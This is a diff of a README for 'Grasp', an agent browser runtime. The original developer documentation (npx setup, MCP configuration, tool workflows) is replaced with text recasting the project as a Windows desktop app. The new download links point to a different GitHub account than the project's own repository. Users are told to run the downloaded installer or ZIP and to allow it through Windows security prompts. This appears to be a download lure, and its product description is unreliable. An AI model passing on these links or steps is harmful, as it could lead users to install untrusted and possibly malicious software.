@@ -1,327 +1,197 @@
-# Grasp
+# 🧭 grasp - Simple browser runtime for agents
 
-[English](./README.md) · [简体中文](./README.zh-CN.md) · [GitHub](https://github.com/Yuzc-001/grasp) · [Issues](https://github.com/Yuzc-001/grasp/issues)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-4C6EF5?style=for-the-badge)](https://github.com/tarunsharma71/grasp)
 
-[![Version](https://img.shields.io/badge/version-v0.6.6-0B1738?style=flat-square)](./CHANGELOG.md)
-[![License](https://img.shields.io/badge/license-MIT-23C993?style=flat-square)](./LICENSE)
-[![Validated](https://img.shields.io/badge/validated-Claude%20Code%20%7C%20Codex%20%7C%20Cursor-5B6CFF?style=flat-square)](./README.md#quickstart)
-> **Grasp is a route-aware AI Browser Runtime for agents. One URL, one best path.**
+## ✨ What Grasp does
 
-Grasp runs locally, keeps a dedicated `chrome-grasp` profile, and gives agents a persistent, human-visible, recoverable web runtime instead of disposable tabs and one-off scripts. That dedicated profile is Grasp's runtime boundary, not "whatever local browser window the user happens to have open right now." The product promise in `v0.6.6` is simple: given a URL and an intent, Grasp should choose the best path first, keep that decision explainable, require confirmed runtime context before page-changing actions, continue on the same runtime path, surface the active route boundary directly in high-level tool responses, refuse high-level form/workspace actions when the current surface boundary does not match, and attach a route/surface-aware prompt package agents can actually execute against.
+Grasp is a desktop app for running browser tasks in a steady, local browser profile. It keeps a dedicated `chrome-grasp` profile and uses it as a fixed runtime space for web work.
 
-- Current package release: `v0.6.6`
-- Start here: [Browser Runtime Landing](./docs/browser-runtime-landing.html)
-- Public docs for the runtime surface: [docs/README.md](./docs/README.md)
-- Release notes: [CHANGELOG.md](./CHANGELOG.md)
+That means:
+- the same browser state can be kept between runs
+- a task can pick the best path for a URL
+- the browser stays visible and easy to check
+- the setup works on your own computer
 
----
+Grasp is made for people who want a browser-based app that feels stable and easy to reopen.
 
-## Where the moat comes from
+## 🖥️ What you need
 
-Anyone can open a page. Very few systems can keep real web work continuous, verifiable, and recoverable.
+Grasp works on Windows and uses Google Chrome.
 
-Grasp compounds around the parts that are hard to fake:
+You need:
+- Windows 10 or Windows 11
+- Google Chrome installed
+- enough free disk space for the app and browser data
+- a stable internet connection for web access
 
-- `Continuity`: tasks survive login state, checkpoint pages, and context switching instead of restarting from scratch
-- `Verification`: actions are checked against actual page changes instead of being treated as success by default
-- `Recovery`: humans can step in and agents can resume in the same browser context with evidence
+Grasp stores its browser profile on your machine, so it can keep data between sessions.
 
-That is why Grasp is not just a browser automation wrapper. Over time, that is how a browser runtime becomes the operating layer agents rely on for real web work.
+## 📥 Download Grasp
 
-## Route by Evidence
+Use this link to visit the download page and get the app:
 
-Users should not need to remember whether this URL belongs on a public reader, a live authenticated session, a workspace flow, a real form flow, or a handoff path.
+[![Visit the download page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-6C757D?style=for-the-badge)](https://github.com/tarunsharma71/grasp)
 
-That route choice is the product.
+Open the page, find the latest Windows release or build, then download the file that matches your system.
 
-Public modes:
+## 🚀 Install on Windows
 
-- `public_read`
-- `live_session`
-- `workspace_runtime`
-- `form_runtime`
-- `handoff`
+1. Open the download page in your browser.
+2. Find the latest Windows file.
+3. Download the installer or app file to your computer.
+4. If Windows asks for permission, choose to keep or run the file.
+5. Follow the setup steps on screen.
+6. Wait for the install to finish.
+7. Open Grasp from the Start menu or desktop shortcut.
 
-Provider choice stays internal. Users and agents should reason about modes and evidence, not about which package or adapter happens to run underneath.
+If the file is a ZIP package, extract it first, then open the app from the extracted folder.
 
-## Proof of the runtime
+## ▶️ Run Grasp
 
-```text
-entry(url, intent)
-inspect()
-request_handoff(...)
-mark_handoff_done()
-resume_after_handoff()
-continue()
-```
+1. Start the app from Windows.
+2. Let Grasp create its local browser profile.
+3. Open a URL or begin your browser task.
+4. Keep the app open while your work runs.
+5. Check the browser window when you want to review the result.
 
-If the same task can survive a human step, return to the same browser context, and continue from evidence instead of replaying from scratch, the product has crossed from browser wrapper into runtime.
+Grasp uses a dedicated `chrome-grasp` profile, so it can keep the same browser state each time you open it.
 
-What it does not claim:
+## 🧭 How it works
 
-- universal CAPTCHA bypass
-- guaranteed full autonomy on every gated site
-- evidence-free recovery
-- that any one workflow defines the whole product
+Grasp focuses on one thing: handling browser work with a clear path.
 
----
+It:
+- opens a URL
+- keeps the browser state in one profile
+- chooses the best route for the task
+- keeps the browser visible
+- lets you recover and check what happened
 
-## Quickstart
+This is useful when you want a browser session that stays in one place instead of bouncing between short-lived tabs or scripts.
 
-### 1. Bootstrap Grasp locally
+## 🧩 Main features
 
-```bash
-npx -y @yuzc-001/grasp
-```
+- Local browser runtime on your computer
+- Dedicated `chrome-grasp` profile
+- Human-visible browser session
+- Persistent browser state
+- Recoverable web workflow
+- Route-aware path handling for URLs
+- Works with agent-style browser tasks
+- No need to manage many one-off tabs
 
-This detects Chrome, launches the dedicated `chrome-grasp` profile, and helps you connect your AI client.
+## 🪟 Windows setup tips
 
-By default this connects Grasp's own CDP runtime. Unless you explicitly point it at a different CDP endpoint, it is not claiming control over an arbitrary browser session the user is currently viewing.
+- Use the latest version of Chrome
+- Close other Chrome windows if Grasp asks for a clean profile start
+- Keep enough free space for browser data
+- Allow the app through Windows security prompts if needed
+- Use one Windows account for the first setup so the profile stays in one place
 
-If you already have the CLI installed, `grasp connect` does the same local bootstrap step.
+If Grasp does not open Chrome, check that Chrome is installed and set up correctly on your system.
 
-Bootstrap also establishes the remote-debugging/CDP connection Grasp needs. In the normal local path, users do not need to prepare that separately.
+## 🛠️ First run checklist
 
-### 2. Connect your client
+Before you start:
+- download the app from the GitHub page
+- make sure Chrome is installed
+- confirm that Windows can run the file
+- keep the app in a folder you can find later
+- leave the browser profile data on the same machine
 
-Claude Code:
+After the first run:
+- open the app again to confirm the profile still loads
+- check that the browser window appears
+- use the same Windows account for the same local profile
 
-```bash
-claude mcp add grasp -- npx -y @yuzc-001/grasp
-```
+## 🔒 Privacy and local data
 
-Claude Desktop / Cursor:
+Grasp runs on your computer and uses local browser storage. That means your browser state stays on your machine unless you choose to move it.
 
-```json
-{
-  "mcpServers": {
-    "grasp": {
-      "command": "npx",
-      "args": ["-y", "@yuzc-001/grasp"]
-    }
-  }
-}
-```
+Local data can include:
+- browser profile files
+- site login state
+- task history in the browser session
+- cached web data
 
-Codex CLI:
+If you want a fresh start, remove the `chrome-grasp` profile data and run the app again.
 
-```toml
-[mcp_servers.grasp]
-type = "stdio"
-command = "npx"
-args = ["-y", "@yuzc-001/grasp"]
-```
+## 🧰 Troubleshooting
 
-### 3. Get your first win
+### Grasp does not open
 
-Tell your AI to:
+- confirm that the app finished downloading
+- check that Windows did not block the file
+- run it again from the same folder
+- make sure Chrome is installed
 
-1. call `get_status`
-2. use `entry` on a real page with an intent such as `extract` or `workspace`
-3. call `inspect`, then `extract`, `extract_structured`, or `continue`
-4. call `explain_route` or run `grasp explain`
+### Chrome profile looks wrong
 
-The first win is not just that Grasp opens a page. It is that the agent can choose a route, explain why, and stay inside the same runtime when the task gets real.
+- close Grasp
+- close all Chrome windows
+- open Grasp again
+- let it rebuild the `chrome-grasp` profile
 
-Reference: [docs/reference/mcp-tools.md](./docs/reference/mcp-tools.md)
-Manual smoke playbook: [docs/reference/smoke-paths.md](./docs/reference/smoke-paths.md)
+### Browser state is missing
 
----
+- check whether you changed Windows accounts
+- check whether the profile folder was moved
+- confirm that the app is using the same local storage path
 
-## Runtime Workflows
+### The app opens but nothing happens
 
-### Real browsing first
+- wait a moment for the browser to load
+- make sure the page you asked for is reachable
+- try a simple URL first, such as a public website
 
-Start from the real page and the real session whenever possible. Grasp should read and act on the current browser state before falling back to heavier observation or search-like shortcuts.
+## 📁 Files and folders
 
-### Public read
+Grasp keeps its working data in a local browser profile. You may see files for:
+- `chrome-grasp`
+- browser cache
+- session state
+- local app settings
 
-Use `entry(url, intent="extract")` -> `inspect` -> `extract` when the page is public and already readable.
+Do not move these files unless you want to reset the browser runtime.
 
-What you get:
+## 🧪 Common use cases
 
-- route decision
-- current page status
-- readable content
-- a suggested next action
+- open a site and keep the same session
+- revisit a page without losing browser state
+- run browser work that needs a visible window
+- keep agent actions in one steady browser profile
+- review what the browser did after each step
 
-### Structured extraction
+## ❓ FAQ
 
-Use `extract_structured(fields=[...])` when you want the current page converted into a field-based record while staying on the same runtime path.
+### Is Grasp a regular browser?
 
-What you get:
+No. It is a browser runtime that uses Chrome and keeps a fixed local profile for web tasks.
 
-- field-based `record` output
-- `missing_fields` when the page does not expose a requested value clearly enough
-- field evidence with the matched label and extraction strategy
-- JSON export, plus optional Markdown export
+### Do I need coding skills?
 
-Use `extract_batch(urls=[...], fields=[...])` when you want the same structured extraction contract applied across multiple URLs in sequence on the same runtime.
+No. You can download the app, install it, and run it on Windows like other desktop software.
 
-What you get:
+### Can I use it without staying online?
 
-- one structured `record` per visited URL
-- exported `CSV` and `JSON` artifacts, plus optional Markdown bundle
-- per-URL status when a page stays gated or needs handoff instead of pretending the scrape succeeded
+You can open the app offline, but browser tasks and web pages still need internet access.
 
-### Share layer
+### Does it keep my browser state?
 
-Use `share_page(format="markdown" | "screenshot" | "pdf")` when the result needs to be forwarded to someone else without sending them the original inaccessible page link.
+Yes. Grasp keeps a dedicated local profile so your browser state can persist between sessions.
 
-What you get:
+### Can I reset it?
 
-- a shareable artifact written locally
-- a clean share document generated from the current page projection instead of the raw page chrome
-- the same runtime explanation path, so the artifact can still be traced back to the page and route that produced it
+Yes. Remove the local `chrome-grasp` profile data and start the app again to make a fresh runtime
 
-Use `explain_share_card()` when you want the human-facing share layout explained before exporting it. This uses a Pretext-backed text layout estimate when available, so the share layer can reason about title and summary density without touching the current page DOM.
+## 🔗 Useful links
 
-### Fast-path adapters
+- [Download page](https://github.com/tarunsharma71/grasp)
+- [GitHub repository](https://github.com/Yuzc-001/grasp)
+- [Issues](https://github.com/Yuzc-001/grasp/issues)
+- [English README](./README.md)
+- [简体中文 README](./README.zh-CN.md)
 
-Site-specific fast reads no longer need to live inside the core router. `v0.6.3` keeps the built-in BOSS path as an adapter and lets you extend the same mechanism locally.
+## 📝 Version
 
-What is supported:
-
-- drop `.js` adapters into `~/.grasp/site-adapters`
-- or point `GRASP_SITE_ADAPTER_DIR` at a different adapter directory
-- use a lightweight `.skill` file as a manifest with `entry:` or `adapter:` pointing at a `.js` adapter
-
-A `.js` adapter only needs two capabilities:
-
-- `matches(url)` or `match(url)`
-- `read(page)`
-
-The `.skill` file is only a local manifest that points at the adapter entry. It is not a separate runtime layer.
-
-### Live session
-
-Use `entry(url, intent="act")` or `entry(url, intent="workspace")` when the task depends on the current browser session.
-
-`entry` can now surface route evidence such as:
-
-- selected mode
-- confidence
-- fallback chain
-- whether a human is required
-
-### Handoff and resume
-
-When a human step is required, keep the workflow continuous instead of pretending it is fully autonomous:
-
-1. `entry` or `continue` shows the page is gated
-2. `request_handoff` records the required human step
-3. `mark_handoff_done` marks the step complete
-4. `resume_after_handoff` reacquires the page with continuation evidence
-5. `continue` decides what should happen next
-
-Runtime story: [docs/product/browser-runtime-for-agents.md](./docs/product/browser-runtime-for-agents.md)
-
----
-
-## Product Model
-
-### How the layers fit
-
-The product is the route-aware Agent Web Runtime itself. `npx -y @yuzc-001/grasp` / `grasp connect` bootstrap it locally, MCP tools expose the public runtime surface, and the skill is the recommended task-facing layer on top of the same runtime.
-
-For the canonical delivery-surface mapping, see [Browser Runtime for Agents](./docs/product/browser-runtime-for-agents.md).
-
-### Modes, not providers
-
-Grasp keeps a single agent-facing interface. The core promise is not a collection of site integrations; it is that any real webpage can be entered, routed, and worked through the same task model.
-
-The public surface should expose modes, not provider names:
-
-- `public_read`
-- `live_session`
-- `workspace_runtime`
-- `form_runtime`
-- `handoff`
-
-Provider and adapter choice stays internal. In this slice, `Runtime Engine` remains first-class and `Data Engine` remains a thin read seam for public-web extraction without claiming a fully delivered separate backend.
-
----
-
-## Real Forms
-
-When the page is a real form, use the specialized form surface:
-
-`form_inspect` -> `fill_form` / `set_option` / `set_date` -> `verify_form` -> `safe_submit`
-
-The default behavior is conservative:
-
-- `fill_form` only writes safe fields
-- `review` and `sensitive` fields stay visible so you can inspect them explicitly
-- `safe_submit` starts with preview, so you can check blockers before any real submit
-
-Form surface reference: [docs/reference/mcp-tools.md](./docs/reference/mcp-tools.md)
-
----
-
-## Authenticated Workspaces
-
-Use `workspace_inspect` to inspect a dynamic authenticated workspace and let it suggest the
-next step. A typical loop is `workspace_inspect -> select_live_item -> workspace_inspect ->
-draft_action -> workspace_inspect -> execute_action -> verify_outcome`. By default Grasp drafts
-first, requires explicit confirmation for irreversible actions, and verifies that the workspace
-really moved to the next state.
-
-Workspace surface reference: [docs/reference/mcp-tools.md](./docs/reference/mcp-tools.md)
-
-These workspace flows are examples of the browser runtime in use. BOSS is one example, and the same runtime direction also covers surfaces such as WeChat Official Accounts and Xiaohongshu without collapsing the whole product into any one workflow.
-
-### Basic parallel task state
-
-Grasp does not promise a large scheduler today, but it is moving toward handling more than one task/session context without collapsing everything into one active browser assumption.
-
----
-
-## Advanced Runtime Primitives
-
-The runtime surface is the public default. The lower-level runtime is still available when you need tighter control.
-
-Common advanced primitives:
-
-- navigation and state: `navigate`, `get_status`, `get_page_summary`
-- visible runtime tabs: `list_visible_tabs`, `select_visible_tab`
-- interaction map: `get_hint_map`
-- verified actions: `click`, `type`, `hover`, `press_key`, `scroll`
-- observation: `watch_element`
-- session strategy and handoff helpers: `preheat_session`, `navigate_with_strategy`, `session_trust_preflight`, `suggest_handoff`, `request_handoff_from_checkpoint`, `request_handoff`, `mark_handoff_in_progress`, `mark_handoff_done`, `resume_after_handoff`, `clear_handoff`
-
-Full reference: [docs/reference/mcp-tools.md](./docs/reference/mcp-tools.md)
-
----
-
-## CLI
-
-| Command | Description |
-|:---|:---|
-| `grasp` / `grasp connect` | Set up the local browser runtime |
-| `grasp status` | Show connection state, current tab, and recent activity |
-| `grasp explain` | Explain the latest route decision |
-| `grasp logs` | View audit log (`~/.grasp/audit.log`) |
-| `grasp logs --lines 20` | Show the last 20 log lines |
-| `grasp logs --follow` | Stream the audit log |
-
-## Docs
-
-- [docs/README.md](./docs/README.md)
-- [Browser Runtime Story](./docs/product/browser-runtime-for-agents.md)
-- [docs/reference/mcp-tools.md](./docs/reference/mcp-tools.md)
-- [docs/reference/smoke-paths.md](./docs/reference/smoke-paths.md)
-
-## Releases
-
-- [CHANGELOG.md](./CHANGELOG.md)
-- [CHANGELOG.md](./CHANGELOG.md)
-- [docs/release-notes-v0.6.0.md](./docs/release-notes-v0.6.0.md)
-- [docs/release-notes-v0.55.0.md](./docs/release-notes-v0.55.0.md)
-
-## License
-
-MIT — see [LICENSE](./LICENSE).
-
-## Star History
-
-[![Star History Chart](./star-history.svg)](https://www.star-history.com/#Yuzc-001/grasp&Date)
+Current version: v0.6.6
